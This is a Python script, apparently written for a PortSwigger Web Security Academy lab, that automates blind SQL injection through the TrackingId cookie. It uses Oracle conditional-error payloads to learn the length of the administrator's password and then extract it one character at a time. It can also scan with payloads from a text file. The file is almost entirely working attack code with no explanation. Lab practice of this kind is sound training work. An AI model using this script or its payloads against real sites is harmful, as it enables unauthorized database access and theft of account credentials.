import requests
import urllib3

urllib3.disable_warnings()

url = 'https://0afd006604b39305c375d9ad006e0069.web-security-academy.net/filter?category=Toys+%26+Games'
proxy_servers = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080',
}

headers = {

        "Cookie": "TrackingId=pjakHuU48es9lO0F; session=N3TMm45PoGw4fJ3kcgJZC0WFl9ayrrD4",
        "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0,",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://portswigger.net/",
        "Upgrade-Insecure-Requests": "1",
        'Sec-Fetch-Dest': "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close",

    }




def check_injection(headers,url):
    # Getting the parameter where vulenrabilty exists
    for i in headers:
        if (i == "Cookie"):
            lol = headers[i]
            text1 = lol[:27]
            text2 = lol[27:-1]

            query = "'"
            payload = text1+query+text2
            headers[i]=payload
            r = requests.get(url,headers=headers)
    if(r.status_code==500):
        print("SQL Injection detected")


def text_scan(header,url):
    print("Scanning from text file.....")
    file = open(r"payloads.txt", "r")
    amp = file.read().split("\n")
    for j in amp:
        for i in headers:
            if (i == "Cookie"):
                lol = headers[i]
                text1 = lol[:27]
                text2 = lol[27:-1]

                query = j
                payload = text1 + query + text2
                headers[i] = payload
                r = requests.get(url, headers=headers)
        if (r.status_code == 500):
            print("SQL Injection detected for the following payload : "+j)

    file.close()





def get_length(headers, url):
    print("Getting password length please wait...")

    for i in headers:
        if (i == "Cookie"):
            lol = headers[i]
            text1 = lol[:27]
            text2 = lol[27:-1]
            for k in range(18, 22):
                query_length = "'||(SELECT CASE WHEN LENGTH(password)>" + str(k) + " THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||"
                payload = text1 + query_length + text2
                headers[i] = payload
                r = requests.get(url,headers=headers)

                if(r.status_code == 200):
                    print("Length of password is: "+str(k))
                    break


def guess_password(headers,url):
    print("Getting the value of password please wait ...")
    password = []
    wordlist = [1,2,3,4,5,6,7,8,9,0,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    for l in headers:
        if (l == "Cookie"):
            lol = headers[l]
            text1 = lol[:27]
            text2 = lol[27:-1]
            for i in range(1,21):
                for j in wordlist:
                    query_password_guess = "'||(SELECT CASE WHEN SUBSTR(password," + str(i) + ",1)='"+str(j)+"' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
                    payload = text1 + query_password_guess + text2
                    headers[l] = payload
                    r = requests.get(url, headers=headers)
                    if(r.status_code == 500):
                        password.append(j)
                        print(str(i)+" charachter is "+ str(j))
                        break
    print("Password is: ",end="")
    for i in password:
        print(i,end="")

a=1
while(a!=0):
    a = int(input("Enter 0 to exit 1 to perform automated scan or enter 2 to give payloads from text file: "))

    if(a==1):
        check_injection(headers,url)
        get_length(headers,url)
        guess_password(headers,url)
    elif(a==2):
        check_injection(headers,url)
        text_scan(headers,url)
